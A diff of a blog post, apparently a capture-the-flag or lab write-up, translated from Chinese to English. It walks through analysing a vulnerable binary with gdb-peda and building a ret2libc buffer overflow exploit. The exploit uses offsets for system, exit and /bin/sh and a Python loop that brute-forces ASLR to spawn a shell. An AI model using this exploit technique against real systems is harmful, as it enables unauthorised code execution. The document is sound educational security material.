@@ -1,19 +1,17 @@
 ---
-title: 使用GDB分析缓存区溢出漏洞
-date: 2025-12-31T08:29:33+08:00
+title: Analyzing Buffer Overflow
+date: 2026-02-06T21:00:00+08:00
 draft: false
 toc: true
 images:
 tags:
-  - Hack
-  - 工具
-  - 缓冲区溢出
+  - English
 ---
-## gdb-peda 分析
+## gdb-peda Analysis
 
-peda 是 Python Exploit Development Assistance 的缩写，这个工具是建立在 GDB 之上的，用 Python 编写的，旨在位利用开发提供版主。其设计初衷是为了让漏洞分析和利用开发过程更加直观高效，通过增强 GDB 的功能，如改进的堆栈、寄存器和内存显示，以及针对二进制分析和漏洞挖掘的实用工具，帮助安全研究人员更快地理解和利用程序中的漏洞。由于利用开发往往需要细致地分析程序执行状态、内存布局反编译代码，gdb-peda 的这些增强功能就显得尤为重要，能大大提升调试和漏洞利用的效率。
+PEDA stands for Python Exploit Development Assistance. It is a tool built on top of GDB  and written in python,designed to assist with exploit develoment. Its primary goal is to make vulnerability analysis and exploit development more intuitive and efficient. By enhancing GDB's functionality-such as providing improved visual displays for the stack,registers and memory. as well as offering practical untilities for binary analysis-it hels security researchers understand and exploit program vulnerabilities more rapidly. Since exploit development often requires meticulous analysis of the program's execution state,memory layout,and decomplied code,the enhanced features of gdb-peda are particularly important for significantly boosting the efficientcy of debugging and exoploitation.
 
-### gdb-peda 下载
+### Downloading gdb-peda
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
@@ -30,9 +28,9 @@ Summary:
   Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 1420
 ```
 
-### 启动分析
+### Starting the Analysis
 
-寻找 peda 存放位置
+First,locate the PEDA installation directory.
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
@@ -59,7 +57,7 @@ Summary:
 lib  peda.py
 ```
 
-启动 peda
+Launch PEDA within GDB
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
@@ -89,7 +87,7 @@ pwndbg> source /usr/share/gdb-peda/peda.py
 gdb-peda$ 
 ```
 
-#### checksec
+#### Checksec
 
 ```bash
 gdb-peda$ checksec
@@ -100,33 +98,36 @@ PIE       : disabled
 RELRO     : Partial
 ```
 
-checksec 的结果反映了目标二进制文件在安全机制上的设置情况，既有不足也有一定的保护。首先，CANARY 和 FORTIFY 被禁用了，这意味着在栈溢出和缓冲区保护方面缺乏内置防护，我们可能利用这些缺陷进行溢出攻击；而 NX 是启用的状态，这会使得某些内存区域（如堆和栈）无法执行代码，从而对注入型攻击提供了一些保护。但同时， PIE 没有启用，说明程序的加载地址是固定的，这在一定程度上降低了地址随机化（aslr）带来的安全优势；RELRO 只处于部分保护状态，未能完全锁定重定位信息，使得部分内存泄漏或修改攻击仍有可能实现。
+The results of checksec reflect the security configuration of the target binary,revealing both vulnerabilities and protections.
 
-##### CANARY（栈保护金丝雀）
+First, Canary and FORTIFY are disabled. This indicates a lack of built-in defenses against stack overflows and buffer manipulation, meaning we might be able to exploit there flaws for an overflow attack.NX is enable, which prevents code execution in certain memory regions, offering some protection against injection-style arracks. However,PIE is disabled, meaning the program's load address is fixed. This partially mitigates the security advantage of Address Space Layout Randomization.Finally,RELRO is only partial, meaning the relocation information isn't fully locaked down, leaving room for potential memory leaks or modification attacks.
 
-CANARY 是在函数返回地址前放置的一个哨兵值，用于检测栈溢出，如果这个值被破坏则说明缓冲区溢出已经发生。编辑器会在函数开始时在栈上防止一个随机值，函数返回前检查这个值是否被改动，如果被改动则终止程序，如果关闭则可能被攻击者直接覆盖返回地址。
+##### CANARY (Stack Canary)
 
-##### FORTIFY（源码加固）
+A Canary is a sentinel value placed before the function return address to detect stack overflows. If this value is corrupted, it indicates that a buffer overflow has occurred. Compilers place a random value on the stack at the start of a function and verify it before the function returns. If the value has changed, the program terminates. If this is disabled, an attacker can directly overwrite the return address.
 
-FORTITY 会检查危险函数，在运行时检测缓冲区溢出，如果检测到溢出即将发生则终止程序，如果关闭使用不安全函数时容易出问题。
+##### FORTIFY (Source Fortification)
 
-##### NX（不可执行位）
+FORTIFY checks for dangerous functions and detects buffer overflows at runtime. If an overflow is detected, the program terminates. If disabled, using unsafe functions becomes prone to issues.
 
-NX（No eXecute），也叫 DEP，将内存区域标记为数据或指令。启用后栈和堆上的数据无法作为代码执行，如果攻击者将 shellcode 注入到栈上 CPU 也会拒绝执行，如果开启则必须使用 ROP 等技术绕过。
+##### NX (No-Execute)
 
-##### PIE（位置无关可执行文件）
+NX (No-Execute), also known as DEP (Data Execution Prevention), marks memory regions as either data or instructions. When enabled, data on the stack and heap cannot be executed as code. If an attacker injects shellcode onto the stack, the CPU will refuse to execute it. Bypassing this usually requires techniques like ROP (Return Oriented Programming).
 
-PIE 配合 ASLR（地址空间分布随机化）使用，让程序每次运行时加载到内存的随机位置。这样攻击者无法预测函数、变量的具体地址，大大增加利用难度。
+##### PIE (Position Independent Executable)
 
-##### RELRO（重定位只读）
+PIE works in conjunction with ASLR (Address Space Layout Randomization) to load the program into random memory locations every time it runs. This prevents attackers from predicting the specific addresses of functions and variables, significantly increasing the difficulty of exploitation.
 
-RELRO 保护 GOT（全局偏移表）不被改写，有两种模式：
-1. Partial RELRO（部分）：将 GOT 放在 BSS 段前面，防止全局变量溢出覆盖 GOT，但本身仍可写。
-2. Full RELRO（完全）：在程序启动时解析所有符号并将整个 GOT 标记为只读，彻底防止 GTO 改写攻击。
+##### RELRO (Relocation Read-Only)
 
-#### disassemble
+RELRO protects the GOT (Global Offset Table) from being overwritten. It has two modes:
 
-主函数反汇编分析：
+1. **Partial RELRO:** Places the GOT before the BSS section to prevent global variable overflows from overwriting the GOT, but the GOT itself remains writable.
+2. **Full RELRO:** Resolves all symbols at startup and marks the entire GOT as read-only, completely preventing GOT overwrite attacks.
+
+#### Disassemble
+
+Analyzing the disassembly of the main function:
 
 ```bash
 gdb-peda$ disassemble main
@@ -152,18 +153,18 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-这个是 x86 汇编语言呈现的 main 函数的底层指令序列。下面来拆解这段代码的功能与逻辑。
+This represents the low-level instruction sequence of the `main` function in x86 assembly language. Let's break down the logic and functionality.
 
-第一行输出分为四个部分：
-第一部分是实际内存地址，例如 `0x0804844d`，表明该指令存放在内存中的具体位置；
-第二部分是函数内偏移量，如 `<+>:`，表示该指令距离函数入口的字节数；
-第三部分显示的是汇编指令助记符，比如 `push`、`mov` 等，指明了执行的具体操作；
-第四部分是操作数，例如 `esp,0x50`，详细说明了指令操作的寄存器或内存地址。
+The output is divided into four parts:
 
-整体上，这段代码是一个 C 程序的 main 函数的汇编表示。它检查命令行参数的数量，并在满足特定条件时调用 errx 函数（报错退出），否则将某个命令行参数复制到一个栈上的缓冲区中（通过 strcpy）。
+1. The actual memory address (e.g., `0x0804844d`).
+2. The offset within the function (e.g., `<+0>:`), indicating bytes from the entry point.
+3. The mnemonic (e.g., `push`, `mov`), indicating the operation.
+4. The operands (e.g., `esp,0x50`), specifying registers or addresses involved.
 
-##### 汇编语言基础
+Overall, this is the assembly representation of a C program's main function. It checks the number of command-line arguments. If specific conditions are met, it calls the `errx` function (error exit); otherwise, it copies a command-line argument into a buffer on the stack using `strcpy`.
 
+##### Assembly Language Basics
 
 | 汇编命令  | 命令来源                           | 解释                                             |
 | ----- | ------------------------------ | ---------------------------------------------- |
@@ -191,9 +192,9 @@ End of assembler dump.
 | edi | Extended Destination Index（扩展目标索引）   | 目标索引寄存器，常用于字符串操作的目标地址指针或数组访问。               |
 | dip | Extended Instruction Pointer（扩展指令指针） | 指令指针寄存器，指向下一条要执行的指令地址，不能直接修改，只能通过跳转/调用命令改变。 |
 
-> 以上内容如使用 pwngdb 原理相同。
+> Note: The principles above apply similarly if using pwndbg._
 
-## 手工测试缓冲区溢出漏洞
+## Manual Buffer Overflow Testing
 
 ```bash
 erso@deathStar1:~$ /bin/dartVader
@@ -206,9 +207,9 @@ erso@deathStar1:~$ /bin/dartVader $(python3 -c 'print("A"*100)')
 Segmentation fault (core dumped)
 ```
 
-发现报错，Segmentation fault （段错误）。程序试图访问非法的内存地址，例如读取或写入未分配的内存、访问超出数组边界的内存、解引用空指针（null pointer）或未初始化的指针、访问受保护的系统内存区域等情形就会报这个错误。操作系统检测到这种非法操作后，会触发 “段错误” 并中止程序运行。而 ”Core Dumped（核心转储）“ 则表示，当段错误发生时，系统可能会生成一个 ”核心转储（core dump）“，记录程序崩溃时的内存状态。
+We encounter an error: **Segmentation fault**. This occurs when a program attempts to access illegal memory addresses, such as reading/writing unallocated memory, accessing memory out of array bounds, dereferencing null/uninitialized pointers, or accessing protected system memory. When the OS detects this, it triggers a "segfault" and aborts the program. "Core Dumped" means the system generated a file recording the memory state at the moment of the crash.
 
-/bin/dartVader 在处理 100 个 A 输入时访问了非法内存，很可能是由于缓冲区溢出或未正确处理长输入导致的。
+`/bin/dartVader` accessed illegal memory when handling 100 'A's, likely due to a buffer overflow or improper handling of long inputs.
 
 ```bash
 erso@deathStar1:~$ dmesg |tail
@@ -224,20 +225,20 @@ erso@deathStar1:~$ dmesg |tail
 [ 6771.328578] dartVader[2743]: segfault at 41414141 ip 41414141 sp bf80b560 error 14
 ```
 
-> dmesg（diagnostic message）用于查看和打印 Linux 内核的消息缓冲。
+> `dmesg` (diagnostic message) is used to view and print the Linux kernel message buffer.
 
-最后一行与 dartVader 相关。/bin/dartVader（PID 2743）在时间戳 6771.328578 秒发生了段错误（segfault）。具体来说，错误发生在内存地址 0x41414141，该地址在十六进制下转换为 ASCII 是 AAAA，正是我们测试的内容，程序试图执行这个非法地址的指令，但它是我们输入的数据而非有效代码；栈指针 esp 为 0xbf80b560，记录了崩溃时的栈位置；错误码 14 表示页面错误（page fault），具体是访问了不可执行的内存区域。
+The last line is relevant to `dartVader`. The process (PID 2743) segfaulted at timestamp 6771.328578. Specifically, the error occurred at memory address `0x41414141` (which is 'AAAA' in Hex—our input). The program tried to execute instructions at this illegal address. The stack pointer (`sp`) was at `0xbf80b560`. Error code 14 indicates a page fault, specifically caused by accessing a non-executable memory region.
 
-可以确认有缓冲区溢出漏洞。一般来说缓冲区溢出漏洞，要写入 shellcode，这样看安全机制是否允许写入。所以利用还要看有什么安全机制，者关乎我们的利用方式和利用是否能成功。
+We can confirm a buffer overflow vulnerability exists. Typically, we would write shellcode, but we must check if security mechanisms allow execution. The available protections dictate our exploitation method.
 
 ```bash
 erso@deathStar1:~$ readelf -W -l /bin/dartVader | grep GNU_STACK
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
 ```
 
-readelf 是用于查看 ELF（Executable and Linkable Format）格式文件信息的工具，ELF 是 Linux 下可执行文件、目标文件和共享库的标准格式。-l 参数显示程序头，-W 参数使用宽行输出，不截断过长的行，便于查看完整信息。
+`readelf` displays information about ELF files. `-l` shows program headers, and `-W` uses wide output.
 
-GNU_STACK 的权限是 RW（可读可写），没可以 X（可执行）。这意味着该程序的堆栈被标记为不可执行。这是现代操作系统中常见的安全特性（称为 NX 或 DEP，Data Execution Pervention），用于防止缓冲区溢出攻击中将恶意代码注入堆栈并执行。也可以在 Kali 中使用 scanelf 检查相关属性。
+The permissions for `GNU_STACK` are `RW` (Read/Write), but not `X` (Execute). This means the stack is marked as non-executable (NX/DEP enabled). This is a modern security feature designed to prevent attackers from injecting and executing malicious code on the stack. You can also use `scanelf` in Kali to check attributes:
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
@@ -246,9 +247,9 @@ GNU_STACK 的权限是 RW（可读可写），没可以 X（可执行）。这�
 ET_EXEC RW- R-- RW- dartVader 
 ```
 
-## 链接动态库依赖情况
+## Dynamic Library Dependencies
 
-查看程序的动态链接库：
+Checking the program's dynamic link libraries:
 
 ```bash
 erso@deathStar1:~$ ldd /bin/dartVader 
@@ -257,29 +258,38 @@ erso@deathStar1:~$ ldd /bin/dartVader
         /lib/ld-linux.so.2 (0xb76e8000)
 ```
 
-ldd 检查 /bin/dartVader 所依赖的共享库，ldd 命令会解析该程序的动态链接信息，并列出所有需要在运行时加载的库。输入中显示了 linux-gate.so.1、libc.so.6 以及动态加载器 /lib/ld-linux.so.2，这证明程序是动态链接的，并依赖这些系统库才能正常运行。从安全角度来看，这有助于了解目标程序的运行环境和潜在攻击面，比如库版本是否存在漏洞或是否容易被替换，从而为渗透测试提供信息。
+`ldd` lists the shared libraries required by the program at runtime. The output shows `linux-gate.so.1`, `libc.so.6`, and the loader `/lib/ld-linux.so.2`. This confirms the program is dynamically linked and relies on these system libraries. From a security perspective, this helps us understand the environment and potential attack surface (e.g., vulnerable library versions).
 
-libc 是指标准 C 库，是大多数 C 程序赖以运作的基础库，它包含了大量用于内存管理、字符串处理、文件操作、数学计算以及系统调用等常见功能。在 Linux 系统中，glibc 是 GNU 实现的 libc，它提供了与操作系统交互所必需的接口。大多数程序在运行时都需要调用 libc 中的函数，而在漏洞利用中，这些函数（比如 system）的位置常常成为攻击链的重要环节，被攻击者利用来实现诸如 ret2libc 的攻击手段，这种类型的攻击叫 ret2libc。
+`libc` is the standard C library, fundamental to most C programs. It contains functions for memory management, string processing, system calls, etc. In Linux, `glibc` is the implementation. Since the program calls `libc` functions, these functions (like `system`) are present in memory and can be leveraged for a **Ret2Libc** attack.
 
-### ret2libc 介绍
+### Ret2Libc Introduction
 
-ret2libc（Return-to-Libc）是一种缓冲区溢出漏洞攻击技术，其基本原理实在存在缓冲区溢出等漏洞时，通过覆盖函数返回地址，使程序跳转到 libc 库中的已知函数（例如 system）执行，从而达到执行任意命令的目的。这种攻击不需要注入新代码，二十利用目标程序中已有的、可信任的库函数，因此可以绕过某些内存保护机制（如不可执行栈 NX/DEP）。我们在漏洞利用过程中通常需要泄露或预测 libc 中这些关键函数地址，然后构造一个有效的攻击链，让程序在返回时跳转到这些函数执行预期的操作。
+**Ret2Libc** (Return-to-Libc) is an attack technique used when a buffer overflow exists but stack execution is blocked (NX/DEP). Instead of injecting new code, the attacker overwrites the return address to jump to an existing function in the `libc` library (e.g., `system`) to execute arbitrary commands. This bypasses NX because the code being executed is part of the legitimate, executable library, not injected data on the stack.
 
-传统的缓冲区溢出攻击通过栈上注入恶意 shellcode，然后覆盖返回地址跳转到 shellcode 执行。但现代系统引入了 NX（No-eXecute）或 DEP（Data Excution Prevention），标记栈为不可执行，导致注入的 shellcode 无法运行。这是，攻击者发现程序通常会链接标准库（如 libc），其中包含许多有用函数（如 system、exit）。这些函数的代码已经在内存中，且是可执行的。于是，Ret2Libc 的思路诞生：与其注入代码，不如直接调用 libc 中的函数。
+The traditional method involves injecting shellcode onto the stack and jumping to it. However, with NX enabled, the stack is non-executable. Attackers realized that standard libraries (like `libc`) are already loaded in memory and marked as executable. Thus, Ret2Libc was born: why inject code when you can just call existing functions?
 
-能实施 ret2libc 攻击主要需要几个条件。首先，目标程序必须存在能够控制返回地址的漏洞，比如缓冲区溢出等漏洞，允许我们覆盖函数返回地址。其次，程序必须动态连接了 libc。另外，由于现代系统普遍采取 ASLR 等内存随机化机制，攻击者还需要有办法泄露 libc 的地址信息或者存在其他绕错机制，否则无法准确定位函数地址。最后，如果系统还启用了 NX/DEP 等防护技术，攻击者也只能利用 ret2libc 这种不依赖注入代码的方式来实现代码执行。因此，漏洞本身、动态链接库以及系统防护配置都是决定是否能成功实施 ret2libc 攻击的关键因素。
+To perform a Ret2Libc attack, several conditions are met:
+
+1. A vulnerability (like buffer overflow) allows control over the return address.
+    
+2. The program is dynamically linked to `libc`.
+    
+3. We must be able to leak or predict the addresses of `libc` functions (defeating ASLR).
+    
+4. If NX is enabled, Ret2Libc is the primary way to achieve code execution without ROP.
+    
 
 #### ASLR
 
-ASLR 全称为 Address Space Layout Randomization（地址空间布局随机化），是一种在每次程序运行时随机分配内存中各个区域加载地址的安全机制。它涵盖了堆、栈、共享库和可执行文件等多个内存区一，使得攻击者很难预测系统中的关键数据和函数的真实位置，从而大大降低了利用固定内存地址攻击的可能性。通过这种不断变换的地址布局，即使利用漏洞获取了部分内存信息，攻击者也难以构造有效的利用连，迫使攻击者不得不寻找信息泄露等其他手段来绕过这一防护措施
+**ASLR** (Address Space Layout Randomization) randomly assigns the memory locations of the heap, stack, shared libraries, and executable segments every time the program runs. This makes it difficult for attackers to predict the location of shellcode or functions.
 
 #### NX/DEP
 
-NX/DEP 全称为 No eXecute/ Data Execution Prevention（不可执行内存/数据执行保护），是一种通过标记内存区域属性来组织恶意代码执行的技术。该机制会将通常用于存储数据的内存区域（例如堆或栈）标记为不可执行区域，从而防止利用缓冲区溢出等漏洞注入并执行代码。NX 主要针对内存页属性，而 DEP 则更多体现在操作系统对整个内存管理的安全策略上。两者结合起来，有效放置了大部分传统的代码注入攻击，使得攻击者必须依赖 ret2lib 等间接利用技术绕过防护。
+**NX/DEP** (No-Execute / Data Execution Prevention) marks memory areas (stack/heap) as non-executable. It prevents the execution of injected shellcode.
 
-### ASLR 状态评估
+### ASLR Assessment
 
-每次执行 ldd 查看动态链接库时都能看到内存中加载的地址不同。
+Every time we run `ldd`, we can see the memory addresses changing:
 
 ```bash
 erso@deathStar1:~$ ldd /bin/dartVader 
@@ -292,21 +302,20 @@ erso@deathStar1:~$ ldd /bin/dartVader
         /lib/ld-linux.so.2 (0xb77ab000)
 ```
 
-这是系统启用了 ASLR 的典型特征，具体验证一下。
+This is a typical sign of ASLR. Let's verify:
 
 ```bash
 erso@deathStar1:~$ cat /proc/sys/kernel/randomize_va_space 
 2
 ```
 
-没错，有 aslr 的存在。它在每次加载程序时都会随机分配动态库的加载地址，目的就是防止攻击者利用固定地址进行利用。
+Yes, ASLR is fully active (value `2`).
 
-`/proc/sys/kernel/randomize_va_space`  这个文件用于控制 Linux 系统中地址空间布局随机化：
-0. 值为 0 时表示关闭 ASLR，此时加载个内存区域的地址固定不变；
-1. 值为 1 时表示开启部分随机化，这种模式下虽然某些区域（例如堆、栈）会随机化，但有的内存区域可能仍然固定或仅随机化有限，使得某些漏洞的利用风险依然存在。
-2. 值为 2 时表示完成开启 ASLR，所有相关内存区域在每次加载时都会尽可能随机化。
+- **0:** Off. Addresses are fixed.
+- **1:** Partial randomization.
+- **2:** Full randomization.
 
-可以尝试将其修改为 0，但是权限往往不允许。
+We can try to disable it, but usually, we don't have permission:
 
 ```bash
 erso@deathStar1:~$ echo 0 > /proc/sys/kernel/randomize_va_space
@@ -333,11 +342,11 @@ erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "(system|e
   2386: 000fc180     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2
 ```
 
-上面查询证明 libc 库中能确定 system、exit 等关键函数在内存中相对具体位置。
+he output confirms the relative positions of `system` and `exit` in the library.
 
-## 利用编写
+## Writing the Exploit
 
-### 确定缓冲区大小
+### Determining Buffer Size
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
@@ -370,9 +379,9 @@ zsh: segmentation fault  ./dartVader
 [*] Exact match at offset 76
 ```
 
-在本地暴力填充确定缓冲区溢出的偏移长度。
+The overflow offset is **76** bytes.
 
-确定需要用到的函数地址。
+Next, we need the addresses of the functions we want to call.
 
 ```bash
 erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "(system|exit)"
@@ -403,13 +412,15 @@ erso@deathStar1:~$ strings -t x /lib/i386-linux-gnu/libc.so.6 | grep -E /bin/sh
  162d4c /bin/sh
 ```
 
-下面为 exit 和 system 的地址：
+**Addresses found (offsets):**
 
-`   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0`
+- `exit`: `0x33260`
+- `system`: `0x40310`
+- `/bin/sh`: `0x162d4c`
 
-`  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0`
+**Exploit Script:**
 
-攥写利用脚本：
+Since ASLR is enabled, the base address of `libc` changes. However, on 32-bit systems, the randomization entropy isn't massive. We can pick a likely base address (observed from previous `ldd` runs) and loop the exploit until the randomization aligns with our hardcoded address.
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
@@ -441,12 +452,17 @@ for i in range(1024):
         print("[-] Failed")
 ```
 
-buffer 由四段组成，offset 填充缓冲区后 system 执行命令 `system("/bin/sh")`，其中 sh 提供 /bin/sh 地址，让 system 抛出 shell。 exit 通常是必要的，它作为 system 的返回地址，遵循 x86 的调用约定（返回地址紧跟函数地址，参数在返回地址后），确保 sh 在 `ESP+4` 被 system 读取，同时防止 system 返回后跳转到 sh 或随机地址。如果没有 exit 会导致崩溃。
+**How the buffer is constructed:**
 
-使用 struct.pack 的目的是将数值形式的地址转换为机器能直接识别的二进制格式，从而能够直接写入内存覆盖返回地址，达到利用的效果。其中 `pack("<I", ...)` 中的 `<` 表示小端格式，而 I 则表示一个 4 字节的无符号整数，确保生成的地址在内存中按照正确的字节顺序排列。
+1. **Offset:** Fills the buffer up to the return address.
+2. **System:** Overwrites the return address with the address of `system()`.
+3. **Exit:** Acts as the return address for `system()`. In x86 calling convention, the stack looks like `[Function Address] [Return Address] [Argument 1]`. When `system` finishes, it will "return" to `exit`, preventing a crash.
+4. **Sh:** The argument for `system` (`/bin/sh`).
 
-循环中调用了 python 标准库中的 subprocess 模块中的 call 函数，用于启动子进程执行可利用程序。传入的参数是一个列表，第一个元素是目标程序的路径，第二个原色是构造好的 payload，作为命令行参数传给目标程序。call 函数会等待子进程结束，并返回该进程的退出状态码并赋值给 ret，0 表示正常退出，非 0 表示可能未利用成功。
+We use `struct.pack("<I", ...)` to convert the integer addresses into Little Endian binary format (4-byte unsigned integer), which allows them to be correctly written into memory to overwrite the return address.
 
-成功利用。
+The loop uses `subprocess.call` to launch the target program with our payload repeatedly. It checks the return code (`ret`). If it returns 0, the exploit likely succeeded (or at least exited cleanly via our `exit` call).
+
+**Result:** Success!
 
 ![Pa1](Pa1.png)
